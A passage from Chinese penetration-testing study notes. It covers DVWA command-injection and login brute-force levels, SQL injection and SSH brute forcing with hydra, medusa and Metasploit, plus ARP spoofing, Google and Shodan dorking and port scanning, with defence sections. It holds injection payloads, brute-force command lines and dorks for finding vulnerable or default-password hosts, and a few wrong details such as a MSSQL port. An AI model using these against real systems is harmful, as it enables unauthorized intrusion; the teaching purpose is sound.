\n```\n\n代码是将&&和；都替换成空，但我们可以用||，只要前面条件为假，就执行后面的命令。例如：**hello || ls**\n\n```\nhelp\nindex.php\nsource\n```\n\n## 7.3 命令执行漏洞[高]\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit' ] ) ) {\n\n    $target = $_REQUEST[\"ip\"];\n    \n    $target = stripslashes( $target );\n    \n    \n    // Split the IP into 4 octects\n    $octet = explode(\".\", $target);\n    \n    // Check IF each octet is an integer\n    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {\n    \n    // If all 4 octets are int's put the IP back together.\n    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];\n    \n    \n        // Determine OS and execute the ping command.\n        if (stristr(php_uname('s'), 'Windows NT')) { \n    \n            $cmd = shell_exec( 'ping  ' . $target );\n            echo '<pre>'.$cmd.'</pre>';\n        \n        } else { \n    \n            $cmd = shell_exec( 'ping  -c 3 ' . $target );\n            echo '<pre>'.$cmd.'</pre>';\n        \n        }\n    \n    }\n    \n    else {\n        echo '<pre>ERROR: You have entered an invalid IP</pre>';\n    }\n    \n    \n}\n\n?> \n```\n\n对获取的ip值，先去下划线处理，然后根据’.’来分成数组，判断是否分成四份且每一份是数字的，然后还原回去，对ip值进行ping操作，否则判定输入ip值为非法ip格式。经过这样的处理，输入的只能是ip格式的参数，确保了执行输入参数的安全性。 \n\n# 8. 暴力破解\n\n暴力破解的关键是字典。用crunch生成字典：\n\n```\ncrunch [min] [max] [characters] -t[patterns] -o[filename]\n\ncrunch 6 8 abc123q -t a@@@@b -o test.txt\n创建一个至少6个字符，至多8个字符，由abc123q生成的由a开头由b结尾的test.txt字典。\n```\n\n## 8.1 网页密码暴力破解[低]\n\n```\nburp suite\n```\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_GET['Login'] ) ) {\n\n    $user = $_GET['username'];\n    \n    $pass = $_GET['password'];\n    $pass = md5($pass);\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows( $result ) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        //Login failed\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n    }\n\n    mysql_close();\n}\n\n?> \n```\n\n代码很简单，用户输入账号密码后，将用户的密码进行MD5加密，从数据库中找相应的账号密码与之对比，相与为1的话输出用户名和头像。\n\n我们随便输入账号密码，用burpsuite拦截数据包。在burpsuite中右键将包发送至intruder模块。进入intruder的positions模块，选择需要爆破的变量，需要爆破的变量前后面都加$，选择攻击类型：\n\n```\nSniper – 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。\n\nBattering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中\n\nPitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量\n\nCluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。\n```\n\n选择cluster bomb，再在payloads模块的payload options添加字典。爆破出结果。\n\n第二种方法是SQL注入，从源码看到没有对username和password进行过滤。当试到6个字段的时候，它说成功进入：\n\n```\n' union select 1,2,3,4,5,6 -- d\n\nWelcome to the password protected area ' union select 1,2,3,4,5,6 -- d\n```\n\n## 8.2 网页密码暴力破解[中]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_GET[ 'Login' ] ) ) {\n\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = mysql_real_escape_string( $user );\n\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = mysql_real_escape_string( $pass );\n    $pass = md5( $pass );\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows($result) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        //Login failed\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n    }\n\n    mysql_close();\n}\n\n?> \n```\n\n mysqli_real_escape_string()会将转义特殊字符，一定程度上防止SQL注入。 所以用[低]的burpsuite方法解决。\n\n## 8.3 网页密码暴力破解[高]\n\n查看源码：\n\n```php\n <?php\n\nif( isset( $_GET[ 'Login' ] ) ) {\n\n    // Sanitise username input\n    $user = $_GET[ 'username' ];\n    $user = stripslashes( $user );\n    $user = mysql_real_escape_string( $user );\n\n    // Sanitise password input\n    $pass = $_GET[ 'password' ];\n    $pass = stripslashes( $pass );\n    $pass = mysql_real_escape_string( $pass );\n    $pass = md5( $pass );\n\n    $qry = \"SELECT * FROM `users` WHERE user='$user' AND password='$pass';\";\n    $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n\n    if( $result && mysql_num_rows( $result ) == 1 ) {\n        // Get users details\n        $i=0; // Bug fix.\n        $avatar = mysql_result( $result, $i, \"avatar\" );\n\n        // Login Successful\n        echo \"<p>Welcome to the password protected area \" . $user . \"</p>\";\n        echo '<img src=\"' . $avatar . '\" />';\n    } else {\n        // Login failed\n        sleep(3);\n        echo \"<pre><br>Username and/or password incorrect.</pre>\";\n        }\n\n    mysql_close();\n}\n\n?> \n```\n\n还是可以用burpsuite解决，但每次登录失败都要sleep3秒，大大降低破解速度。\n\n## 8.4 SSH密码暴力破解\n\n### 8.4.1 hydra\n\n```\n世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。\n```\n\n```\nExamples:\n  hydra -l user -P passlist.txt ftp://192.168.0.1\n  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN\n  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5\n  hydra -l admin -p password ftp://[192.168.0.0/24]/\n  hydra -L logins.txt -P pws.txt -M targets.txt ssh\n  hydra -L logins.txt -P pws.txt -M targets.txt ssh -o ssh-hydra.ok\n```\n\n### 8.4.2 medusa\n\n```\n速度快，支持大规模并行，模块化，爆破登录，可以同时对多个主机、用户或密码执行强力测试。medusa和hydra一样，同样属于在线密码破解工具。不同的是，medusa的稳定性相较于hydra要好很多，但其支持模块要比hydra少一些。\n```\n\n```\nmedusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n\nmedusa -M ssh -H hostlist.txt -U userlist.txt -P passlist.txt -O ssh.log\n```\n\n### 8.4.3 patator\n\n```\npatator ssh_login host=192.168.137.147 user=root password=FILE0 0=passlist.txt -x ignore:mesg='Authentication failed'\n```\n\n### 8.4.5 brutespray\n\n```\nbrutepray是一款基于nmap扫描输出的gnmap/XML文件，自动调用medusa对服务进行爆破。\n```\n\nkali安装brutespray\n\n```\napt-get update\napt-get install brutespray\n```\n\nbrutespray语法参数\n\n```\n  -f FILE, --file FILE  GNMAP, JSON or XML file to parse\n  -o OUTPUT, --output OUTPUT\n                        Directory containing successful attempts\n  -s SERVICE, --service SERVICE\n                        specify service to attack\n  -t THREADS, --threads THREADS\n                        number of medusa threads\n  -T HOSTS, --hosts HOSTS\n                        number of hosts to test concurrently\n  -U USERLIST, --userlist USERLIST\n                        reference a custom username file\n  -P PASSLIST, --passlist PASSLIST\n                        reference a custom password file\n  -u USERNAME, --username USERNAME\n                        specify a single username\n  -p PASSWORD, --password PASSWORD\n                        specify a single password\n  -c, --continuous      keep brute-forcing after success\n  -i, --interactive     interactive mode\n  -m, --modules         dump a list of available modules to brute\n  -q, --quiet           supress banner\n```\n\n### 8.4.6 msf\n\n```\nmetasploit framework是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的perl编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。\n```\n\n#### 8.4.6.1. SSH模块\n\n```\n┌──(root💀kali)-[~]\n└─# msfconsole\nmsf6 > search ssh\n```\n\n#### 8.4.6.2. SSH用户枚举\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_enumusers\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /root/userlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_enumusers) > run\n```\n\n#### 8.4.6.3. SSH版本探测\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_version\nmsf6 auxiliary(scanner/ssh/ssh_version) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_version) > run\n```\n\n#### 8.4.6.4. SSH暴力破解\n\n```\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.137.147\nmsf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/userlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /root/passlist.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n```\n\n\n\n### 8.4.7 burpsuite\n\n8.1-8.3用的就是burpsuite暴力破解的例子。\n\n## 8.5 暴力破解防御\n\n```\n1.sueradd shell[推荐]\nuseradd v5le0n9 -s /sbin/nologin\n\n2.密码的复杂性[推荐]\n字母大小写+数字+特殊字符+20位以上+定期更换\n\n3.修改默认端口[推荐]\n/etc/ssh/sshd_config\nport 22222\n\n4.限制登录的用户或组[推荐]\n#permitrootlogin yes\nallowusers v5le0n9\n\nman sshd_config\nallowusers allowgroups denyusers denygroups\n\n5.使用sudo，不用root用户[推荐]\n\n6.设置允许的IP访问[可选]\n/etc/hosts.alllow，例如sshd:192.168.137.147:allow\nPAM基于IP限制\niptables/firewalld\n只能允许从堡垒机访问\n\n7.使用denyhosts自动统计，并将其加入到/etc/hosts.deny\n\n8.基于PAM实现登录限制[推荐]\n模块：pam_tally2.so\n功能：登录统计\n示例：实现防止对sshd暴力破解\ngrep tally2 /etc/pam.d/sshd\nauth required pam_tally2.so deny=2 even_deny_root root_unlock_time=60 unlock_time=6\n\n9.禁用密码改用公钥方式认证\n/etc/ssh/ssh_config\npasswordauthentication no\n\n10.保护shell导出会话文件[小心]\n\n11.GRUB加密[针对本地破解]\n```\n\n# 9. 中间人攻击\n\n利用ARP，ARP是地址解析协议，将IP地址转化为MAC地址。\n\nkali抓包\n\n```\ntcpdump -i eth0 -nn arp\tand host 192.168.137.147 抓ARP协议包\n```\n\n```\nettercap -G\t图形化\n```\n\n使用静态IP/MAC防止中间人攻击(windows下)\n\n```\nnetsh i i show in\t查看本地网络IDX值\nnetsh -c \"i i\" add ne idx值 192.168.137.147 00-aa-00-62-6-c6-09\t永久绑定\narp -a\t查看是否绑定成功\nnetch -c \"i i\" delete neighbors idx值\t删除绑定的IP/MAC\n```\n\nLinux下\n\n```\narp -s 192.168.137.147 00-aa-00-62-6-c6-09\n```\n\n# 10. WEB信息收集\n\n## 10.1 网络信息收集的内容\n\n### 10.1.1. 网络攻击信息收集\n\n入手点：目标的名称和域名\n\n攻击准备阶段：\n\n- 在网络中的“地理位置”\n- 与真实世界的联系(实施社工和物理攻击)\n- “网络地图”\n- 攻击所需的更详细信息\n\n攻击实施阶段：\n\n- 目标系统中存在的安全缺陷和漏洞\n- 目标系统的安全防护机制\n\n### 10.1.2. 网络防御信息收集\n\n追查入侵者的身份、网络位置、所攻击的目标、采用的攻击方法等\n\n一般被归入取证与追踪技术范畴\n\n## 10.2 信息收集的方式\n\n1. 主动信息收集\n\n- 通过直接访问、扫描网站，这种流量将流经网站。\n- 能获取更多的信息， 但目标主机可能会记录操作记录。\n\n2. 被动信息收集\n\n- 利用第三方的服务对目标进行访问了解，如搜索引擎等。\n- 收集的信息会相对较少，但是行动并不会被目标主机发现。\n\n## 10.3 信息收集的技术方法\n\n$$\n\\begin{cases}踩点\\begin{cases}Web搜索与挖掘\\\\DNS和IP查询\\\\网络拓扑和侦察\\end{cases}\\\\扫描\\begin{cases}主机扫描\\\\端口扫描\\\\系统类型探查\\\\漏洞扫描\\end{cases}\\\\查点\\begin{cases}旗标抓取\\\\网络服务查点\\end{cases}\\end{cases}\n$$\n\n### 10.3.1 网络踩点技术\n\n#### 10.3.1.1. 踩点\n\n- 有计划、有步骤的信息情报收集\n- 了解攻击目标的网络环境和信息安全装库啊\n- 得到攻击目标剖析图\n\n#### 10.3.1.2. 踩点目的\n\n- 通过对完整剖析图的细致分析\n- 攻击者将会从中寻找出攻击目标可能存在的薄弱环节\n- 为进一步的攻击行动提供指引\n\n#### 10.3.1.3. 踩点针对的信息\n\n##### 10.3.1.3.1 目标组织\n\n- 具体使用的域名\n- 网络地址范围\n- 因特网上可直接访问的IP地址与网络服务\n- 网络拓扑结构及软硬件\n- 电话号码段\n- 电子邮件列表\n- 信息安全状况\n\n##### 10.3.1.3.2 目标个人\n\n- 身份信息、联系方式、职业经历、甚至一些个人隐私信息\n\n#### 10.3.1.4. 踩点技术手段\n\n##### 10.3.1.4.1 Web信息搜索与挖掘\n\n对目标组织或个人的大量公开或意外泄漏的Web信息进行挖掘。\n\n###### 10.3.1.4.1.1. Google Hacking\n\n```\n#site\n功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。\nsite:zhihu.com\t\t\t\t搜索跟zhihu.com相关的网页\n\"web安全\" site:zhihu.com\t\t搜索zhihu.com跟web安全相关的内容\n\"sql注入\" site:csdn.net\t\t在csdn.net搜索跟SQL注入相关的内容\n\"教程\" site:pan.baidu.com\t\t在百度盘搜索教程\n```\n\n```\n#filetype\n功能：搜索指定文件类型\n\"web安全\" filetype:pdf\t\t搜索跟web安全有关的pdf文件\nnamp filetype:ppt\t\t\t搜索跟nmap相关的ppt文件\nsite:csdn.net filetype:pdf\t搜索csdn网站中的pdf文件\n```\n\n```\n#inurl\n功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站\ninurl:.php?id=\t\t\t\t搜索网址中有\".php?id=\"的网页\ninurl:view.php=?\t\t\t搜索网址中有\"view.php=?\"的网页\ninurl:.jsp?id=\t\t\t\t搜索网址中有\".jsp?id=\"的网页\ninurl:.asp?id=\t\t\t\t搜索网址中有\".asp?id=\"的网页\ninurl:/admin/login.php\t\t搜索网址中有\"/admin/login.php\"的网页\ninurl:login\t\t\t\t\t搜索网址中有\"login\"的登录网页\n```\n\n```\n#intitle\n功能：搜索标题存在特点关键字的网页\nintitle:后台登录\t\t\t\t\t\t\t\t搜索网页标题是\"后台登录\"的网页\nintitle:后台管理 filetype:php\t\t\t\t\t搜索网页标题是\"后台管理\"的php页面\nintitle:index of \"parent directory\"\t\t   \t   搜索根目录相关的索引目录信息\n```\n\n```\n#intext\n功能：搜索正文存在特定关键字的网页\nintext:powered by Discuz\t\t\t搜索Discuz论坛相关的页面\nintext:powered by wordpress\t\t\t搜索wordpress制作的博客网址\nintext:powered by *CMS\t\t\t\t搜索基于*CMS的网址，CMS是内容管理系统，建站系统\nintext:powered by xxx inurl:login\t搜索此类网址的后台登录页面\t\n```\n\n```\n#符号\n-keyword\t\t强制结果不要出现此关键字，例如：电影 -黑客\n*keyword\t\t模糊搜索，强制结果包含此关键字，例如：电影 一个叫*决定*\n\"keyword\"\t\t强制搜索结果整体出现此关键字，例如：书籍 \"web安全\"\n```\n\n```\n#快捷键\nCtrl + F\t\t想要在页面中查找某关键字的位置\nCtrl + +/-/0\t放大、缩小页面，0是回到100%\nCtrl + L\t\t选中页面中的地址栏\nCtrl + Tab\t\t切换标签页\nAlt + Tab\t\t切换窗口\n```\n\n例：搜纽约时报网站(nytimes.com)在2008年到2010年关于大学(college)测验分数(test scores)但不是SAT入学分数的文章。\n\n```\nsite:nytimes.com ~college \"test scores\" -SATs 2008..2010\nsite:nytimes.com\t//只搜索某个网站的页面\n~college\t\t\t//同时搜索近义词比如university,higher education\n\"test scores\"\t\t//整体作为关键词\n-SATs\t\t\t\t//排除SATs\n2008..2010\t\t\t//显示指定年份时间段内的搜索结果\n```\n\n###### 10.3.1.4.2. Shodan Hacking\n\n```\nhttp://www.shodan.io\nShodan(撒旦搜索引擎)被称为“最可怕的搜索引擎”，可扫描一切联网的设备。除了常见的web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。\n```\n\n```\n#ip\n114.114.114.114\n```\n\n```\n#service/protocol\nhttp\nhttp country:\"DE\"\t\t使用高级搜索要注册登录才能搜索\nhttp product:\"Apache httpd\"\n\nssh\nssh default password\nssh default password country:\"JP\" city:\"Tokyo\"\n```\n\n```\n#keyword\n基于关键词搜索的思路是根据banner(设备指纹)来搜索\n\"default password\" country:\"TH\"\nFTP anon successful\n```\n\n```\n#product\nproduct:\"Microsoft IIS httpd\"\nproduct:\"nginx\"\nproduct:\"Apache httpd\"\nproduct:MySQL\n```\n\n```\n#version\nproduct:MySQL version:\"5.1.73\"\nproduct:\"Microsoft IIS httpd\" version:\"7.5\"\n```\n\n```\n#hostname\nhostname:.org\nhostname:.edu\n```\n\n```\n#os\nos:\"Windows Server 2008 R2\"\nos:\"Windows 7 or 8\"\nos:\"Linux 2.6.x\"\n```\n\n```\n#net\nnet:110.180.13.0/24\n200 ok net:110.180.13.0/24\n200 ok country:JP net:110.180.13.0/24\n```\n\n```\n#port\nport:3389\nport:445\nport:22\n```\n\n远程桌面连接mstsc，好像要Win10专业版才行。\n\n###### 10.3.1.4.3. Zoomeye Hacking\n\n```\nhttps://www.zoomeye.org\nZoomEye(钟馗之眼)是一个面向网络空间的搜索引擎，“国产的shodan”。\n\nip\t\t\tip:35.185.77.2\nos\t\t\tos:linux\napp\t\t\tapp:Apache httpd\nservice\t\tservice:routersetup\t公网路由器\nport\t\tport:3389\ncountry\t\tcountry:cn\ncity\t\tcountry:cn +city:hangzhou\nver\t\t\tapp:Apache httpd +ver:2.2.16\ncidr\t\tcidr:35.185.77.2/24\t\tIP的CIDR网段\nhostname\thostname:google.com\t\nsite\ntitle\nheader\nkeywords\ndesc\n\n用户手册：https://www.zoomeye.org/help\n```\n\n###### 10.3.1.4.1.4 元搜索引擎\n\n集成多个搜索引擎进行信息收集\n\n基于元搜索引擎实现被篡改网站发现\n\n{% asset_img 元搜索引擎.jpg 元搜索引擎 %}\n\n###### 10.3.1.4.1.5 防范措施\n\n- 注意组织安全敏感信息以及个人隐私信息不要在因特网上随意发布\n- 个人上网时尽量保持匿名\n- 提供个人隐私信息时，应选择具有良好声誉并可信任的网站\n- 定期对自身单位及个人在Web上的信息足迹进行搜索\n\n##### 10.3.1.4.2 DNS与IP查询\n\n###### 10.3.1.4.2.1 Whois查询\n\nwhois是用来查询域名注册所有者等信息的传输协议。\n\n通过 whois 来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS 解析服务器、注册人联系电话等等，可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。\n\nhttp://whois.chinaz.com/\n\n###### 10.3.1.4.2.2 备案信息\n\n网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等）。\n\n利用技巧：\n\n- DNS解析记录可以反查 IP，比较早的解析记录有时可以查到真实 IP，需要留意一下。\n- 注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。\n\nhttps://icp.chinaz.com/\n\n###### 10.3.1.4.2.3 DNS服务：从DNS到IP的映射\n\n先了解一下域名层级：以百度为例子：www.baidu.com。依次是com(顶级域名)、baidu(一级域名)、www(二级域名)。但是实质上还有一个唯一的根域名root：www.baidu.com.root，但由于root是唯一的，因此是否写root根域名不是特别必要。\n\nDNS查询工具：\n\n系统自带：nslookup(Windows)、dig(Linux)\n\n```\n>nslookup www.gzhu.edu.cn\n服务器:  UnKnown\nAddress:  202.192.18.10\n\n名称:    gzhu-edu-cn.cname.saaswaf.com\nAddresses:  2001:250:100d:ffac:121:194:14:82\n          2001:250:100d:ffac:121:194:14:83\n          2001:da8:2032:1006:10:0:213:50\n          2001:da8:2032:1006:10:0:213:51\n          58.205.213.52\n          121.194.14.85\n          121.194.14.84\nAliases:  www.gzhu.edu.cn\n```\n\n###### 10.3.1.4.2.4 IP->location查询\n\nIP地址到现实世界中的具体地理位置。\n\n域名->IP地址->地理位置\n\nhttps://cz88.net/\n\n###### 10.3.1.4.2.5 防范措施\n\n- 公用数据库中提供信息的安全问题\n\n  - 必须向注册机构提供尽可能准确的信息\n\n- 采用一些安防措施不让攻击者轻易得手\n\n  - 及时更新管理性事务联系人的信息\n\n  - 尝试使用虚构的人名来作为管理性事务联系人\n\n    HoneyMan：帮助发现和追查那些在电话或邮件中试图冒充虚构人名的“社会工程师”。\n\n  - 慎重考虑所列的电话号码和地址等信息\n\n  - 注意域名注册机构允许更新注册信息的方式，并确保其中关键信息的安全\n\n##### 10.3.1.4.3 网络侦察\n\n###### 10.3.1.4.3.1 Traceroute路由追踪\n\n- 探测网络路由路径，可用于确定网络拓扑\n- 主机发送TTL从1开始逐步增1的IP包，网络路径上路由器返回ICMP TIME_EXECEEDED\n- UNIX/Linux: traceroute\n  Windows: tracert\n- 穿透防火墙: traceroute-S -p53 TARGET_IP\n- 图形化界面工具: VisualRoute, NeoTrace, Trout\n\n```\n>tracert www.gzhu.edu.cn\n\n通过最多 30 个跃点跟踪\n到 gzhu-edu-cn.cname.saaswaf.com [121.194.14.84] 的路由:\n\n  1     9 ms    13 ms     8 ms  172.29.255.254\n  2     *        *        *     请求超时。\n  3     *        *        *     请求超时。\n  4     *        *        *     请求超时。\n  5    12 ms     6 ms    11 ms  scn-rgw8.gznet.edu.cn [202.112.19.85]\n  6     6 ms    11 ms     8 ms  101.4.114.62\n  7     *        *        *     请求超时。\n  8     *        *        *     请求超时。\n  9     *        *        *     请求超时。\n 10     *        *        *     请求超时。\n 11     *        *        *     请求超时。\n 12    62 ms    57 ms    67 ms  101.4.117.177\n 13    60 ms    60 ms    58 ms  202.200.28.186\n 14    59 ms    56 ms    57 ms  121.194.14.84\n\n跟踪完成。\n```\n\n### 10.3.2 网络扫描技术\n\n| 网络扫描类型          | 网络扫描目的                                                 |\n| --------------------- | ------------------------------------------------------------ |\n| 主机扫描              | 找出网段内活跃主机                                           |\n| 端口扫描              | 找出主机上所开放的网络服务                                   |\n| 操作系统/网络服务辨识 | 识别主机安装的操作系统类型与开放网络服务类型，以选择不同渗透攻击代码及配置 |\n| 漏洞扫描              | 找出主机/网络服务上所存在的安全漏洞，作为渗透点              |\n\n#### 10.3.2.1 主机扫描(Ping扫描)\n\n主机扫描目的：检查目标主机是否活跃\n\n主机扫描方式：\n\n- 传统ICMP Ping扫描\n- ACK Ping扫描\n- SYN Ping扫描\n- UDP Ping扫描：到关闭端口\n\n主机扫描程序：\n\n- Ping\n- Nmap：-sP选项，缺省执行，集合了以上几种扫描方式\n\nPing扫射：同时扫描大量地IP地址段，以发现某个IP地址是否绑定活跃主机的扫描。\n\n主机扫描防范措施：\n\n单一主机Ping扫描很常见，危害性也不大，更关注Ping扫射。\n\n监测：网络入侵检测系统Snort；主机扫描监测工具Scanlogd\n\n防御：仔细考虑对ICMP通信的过滤策略\n利用Ping构建后门: loki(Phrackv51#06), pingd\n\n#### 10.3.2.2 端口扫描\n\n端口：TCP/UDP(1-64K)，运行网络应用服务\n\n端口分类：\n\n1. 知名端口0-1023(Well_Known Ports)\n\n- 80/TCPHTTP(超文本传输协议)：用于传输网页\n- 81/TCPHTTP预备(超文本传输协议)\n- 443/TCPHTTPS(超文本安全传输协议)\n\n2. 注册端口为1024-49151(Registered Ports)\n\n- 4433/tcp, udp\t\t     Microsoft SQL database system \n- 1434/tcp, udp             Microsoft SQL Monitor\n\n3. 动态端口或私有端口为49152-65535(Dynamic Ports)\n\n- 这些端口号一般不固定分配给某个服务，只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。\n\n连接目标主机的TCP和UDP端口，确定哪些服务正在运行即处于监听状态的过程。\n\n端口扫描目的：\n\n- 防御者－更加了解所管理的网络状况，找出没有必要开放的端口并关闭，这是保证业务网络安全的第一步。\n- 攻击者－找出可供进一步攻击的网络服务，同时结合操作系统探测技术也可以确定目标主机所安装的操作系统版本。开放网络服务和操作系统版本信息为攻击者提供了破解攻击的目标，使其更容易找出进入目标主机的漏洞路径。\n\n##### 10.3.2.2.1 TCP连接扫描\n\n- 调用connect() socket函数连接目标端口\n- 开放端口：完成完整的TCP三次握手(SYN, SYN|ACK, ACK)，timeout/RST\n- 关闭端口：SYN, RST\n- 优势&弱势：无需特权用户权限可发起，目标主机记录大量连接和错误信息，容易检测\n\n{% asset_img TCP连接扫描.png TCP连接扫描 %}\n\n##### 10.3.2.2.2 SYN扫描\n\n- 半开扫描(half-open scanning)\n- 开放端口：攻击者SYN, 目标主机SYN|ACK, 攻击者立即反馈RST包关闭连接\n- 关闭端口：攻击者SYN, 目标主机RST\n- 优势&弱势：目标主机不会记录未建立连接，较为隐蔽，需根用户权限构建定制SYN包\n\n{% asset_img SYN扫描.png SYN扫描 %}\n\n##### 10.3.2.2.3 隐蔽端口扫描\n\nTCP连接扫描和SYN扫描并不隐蔽：防火墙会监控发往受限端口的SYN包。\n\n隐蔽端口扫描通过构造特殊的TCP标志位，以躲避检测，同时达成端口扫描目的。\n\nFIN扫描(只带FIN位), Null扫描(全为0), XMAS扫描(FIN/URG/PUSH)\nFTP弹射扫描：利用FTP代理选项达到隐蔽源地址\n\n- 开放端口：标准TCP协议规范，接受这些伪造TCP包，丢弃，无任何反馈\n- 关闭端口：反馈RST包\n\nWindows/Cisco等系统没有遵从规范，开放端口对于伪造TCP包也反馈RST，以上这三种方法不适用。\n\n##### 10.3.2.2.4 UDP端口扫描\n\n- 对目标端口发送特殊定制的UDP数据报文\n- 开放端口: UDP反馈\n- 关闭端口: ICMP port unreachable报文\n\n{% asset_img UDP端口扫描.png UDP端口扫描 %}\n\n```\nnmap -sU\n```\n\n##### 10.3.2.2.5 防范措施\n\n- 任何攻击技术都是双刃剑\n\n  网络管理员也可利用端口扫描确定开放必要服务\n\n- 端口扫描的监测\n  网络入侵检测系统: Snort中的portscan检测插件\n  系统扫描检测工具: scanlogd, PortSentry, Genius\n\n- 端口扫描的预防\n\n  - 开启防火墙\n    类UNIX: netfilter/IPTables, Win32: 个人防火墙\n  - 禁用所有不必要的服务,尽可能减少暴露面(进一步的受攻击面)\n    类UNIX: /etc/inetd.conf，Win32: 控制面板/服务\n\n##### 10.3.2.2.6 目录扫描\n\n目录扫描要有字典，相当于暴力破解，扫描是否有字典中的目录。kali下的目录扫描工具：dirb/dirsearch\n\n```\ndirb http://192.168.137.146/mutillidae\n\npython3 dirsearch.py -u www.XXX.com -e*(-e参数也可不指定语言，用*号表示所有语言)\n```\n\n返回CODE:200才可以进去此目录。\n\n#### 10.3.2.3 系统类型探查\n\n系统类型探查：探查活跃主机的系统及开放网络服务的类型\n\n1. 目标主机上运行着何种类型什么版本的操作系统\n2. 各个开放端口上监听的是哪些网络服务\n\n目的：\n\n- 为更为深入的情报信息收集，真正实施攻击做好准备\n- 如远程渗透攻击需了解目标操作系统类型与配置\n\n##### 10.3.2.3.1 操作系统类型探查\n\n通过各种不同操作系统类型和版本实现机制上的差异：\n\n- 协议栈实现差异－协议栈指纹鉴别\n- 开放端口的差异－端口扫描\n- 应用服务的差异－旗标攫取\n\n通过特定方法以确定目标主机所安装的操作系统类型和版本的技术手段。\n\n明确操作系统类型和版本是进一步进行安全漏洞发现和渗透攻击的必要前提。\n\n辨识方式：\n\n–主动－操作系统主动探测技术\n\n–被动－被动操作系统识别技术\n\n###### 10.3.2.3.1.1 利用网络协议栈指纹识别OS\n\nPing中的TTL。TTL：生存时间\n\n| 操作系统    | TTL  |\n| ----------- | ---- |\n| LINUX       | 64   |\n| WIN2K/NT    | 128  |\n| WINDOWS系列 | 32   |\n| UNIX系列    | 255  |\n\n现实中的TTL值可能都不是以上数值，跟哪个接近就判断是哪个系统。\n\n##### 10.3.2.3.2 网络服务类型探查\n\n确定目标网络中开放端口上绑定的网络应用服务类型和版本。\n\n了解目标系统更丰富信息, 可支持进一步的操作系统辨识和漏洞识别。\n\n网络服务主动探测：旗标抓取\n\n```\nnmap -sV\n```\n\n网络服务被动识别：特征匹配PADS\n\n##### 10.3.2.3.3 